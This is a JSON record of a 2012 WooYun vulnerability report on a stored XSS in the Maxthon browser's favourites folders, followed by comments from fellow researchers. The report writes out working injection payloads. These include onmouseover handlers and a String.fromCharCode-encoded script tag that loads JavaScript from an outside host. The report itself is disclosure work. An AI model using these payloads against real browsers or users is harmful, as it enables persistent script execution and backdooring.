{"id": 19716, "wybug_id": "wooyun-2012-08214", "wybug_title": "遨游浏览器xss 0day", "wybug_corp": "傲游", "wybug_author": "random_", "wybug_date": "2012-06-12 14:14", "wybug_open_date": "2012-06-17 14:15", "wybug_type": "远程代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "持久型", "浏览器", "浏览器漏洞利用技巧", "浏览器漏洞", "浏览器漏洞挖掘", "浏览器漏洞利用", "浏览器实现漏洞", "浏览器特性", "浏览器安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-06-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-06-17：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 遨游浏览器某功能才存在存储型xss。可致留后门。 详细说明：  一时兴起，挖了一上午，找到了一个漏洞(本人遨游版本v3.3.9.1000)。没给出exp，不过再花点时间，研究一下遨游的sandbox代码，就能写出来了。遨游浏览器的收藏夹，容许用户建文件夹，我之前试了\n\">'><embed>\n没效果，也没看源码就拉到了。今天兴起，看源码，是这样：\n\n于是新建文件夹\n\"> onmouseover='javascript:alert(/xss  by tmxk.org</SPAN>/)'\n\n\n已经有了，怎么利用呢，于是测试了容许最大长度，发现没限制。于是测试发现没效果，\n\"> onmouseover=javascript:write(\"<script>alert()</script>\")\n哦这个转意了，于是，改变代码：\ntmxk.org\" onmouseover='javascript:write(String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,41,60,47,115,99,114,105,112,116,62)'\n成功了。于是测试：\n\"> onmouseover=javascript:write(\"<script/src=//tmxk.org/q.js>\")\n同样变化代码，没有效果，纠结了一会儿，才明白//网址默认协议与当前页面协议一致，而遨游的属性页是mx://于是这样写\n\"> onmouseover=javascript:write(\"<script src=http://tmxk.org/q.js></script>\")\n变换代码：\ntmxk.org\" onmouseover='javascript:write(String.fromCharCode(60,115,99,114,105,112,116,32,115,114,99,61,104,116,116,112,58,47,47,116,109,120,107,46,111,114,103,47,113,46,106,115,62,60,47,115,99,114,105,112,116,62))'\n\n\n\n\n所有测试截图：\n\n   漏洞证明：     修复方案：  你懂得，我还得挖掘。   版权声明：转载请注明来源 random_@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2012-06-17 14:15 厂商回复：  漏洞Rank：16  (WooYun评价) 最新状态： 2012-07-23：已修复. 2012-07-23：已修复.  ", "replys": "漏洞评价：\n评论\n     2012-06-12 14:27 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  可以执行代码的吧，洞主努力！    \n     2012-06-12 14:34 |    \t\trandom_ \t\t\t( 普通白帽子  |\t\t\t        Rank:295 漏洞数:50        | 推动开源推动网络安全)\t\t \n  @xsser 哈哈 还得深入学习    \n     2012-06-12 14:38 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @random_ 这里有深入的讨论，xss之后可以看看上下文，然后做更多的事情 http://zone.wooyun.org/zone/browser    \n     2012-06-12 15:07 |    \t\trandom_ \t\t\t( 普通白帽子  |\t\t\t        Rank:295 漏洞数:50        | 推动开源推动网络安全)\t\t \n  @xsser 我意识到了 挖是一回事 技巧就那些 但利用是一回事 千变万化 只有实战利用才会提高    \n     2012-06-12 17:08 |    \t\twanglaojiu \t\t\t( 普通白帽子  |\t\t\t        Rank:168 漏洞数:39        | 道生一，一生二，二生三，三生万物，万物负...)\t\t \n  http://tmxk.org/forum.php?mod=viewthread&tid=501也是个说傲游的    \n     2012-06-12 17:10 |    \t\twanglaojiu \t\t\t( 普通白帽子  |\t\t\t        Rank:168 漏洞数:39        | 道生一，一生二，二生三，三生万物，万物负...)\t\t \n  汗，发现是同一个人....    \n     2012-06-12 18:04 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  @random_ 好厉害@_@ 拜模你啊    \n     2012-06-12 21:18 |    \t\tpopok \t\t\t( 普通白帽子  |\t\t\t        Rank:117 漏洞数:24        | nothing)\t\t \n  话说你们这帮人傲游和遨游从来不分的么？    \n     2012-06-12 23:17 |    \t\trandom_ \t\t\t( 普通白帽子  |\t\t\t        Rank:295 漏洞数:50        | 推动开源推动网络安全)\t\t \n  @popok maxthon就行 写错了    \n     2012-06-13 15:29 |    \t\tVivenChen \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:1        | 平平淡淡过日子)\t\t \n  厉害    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}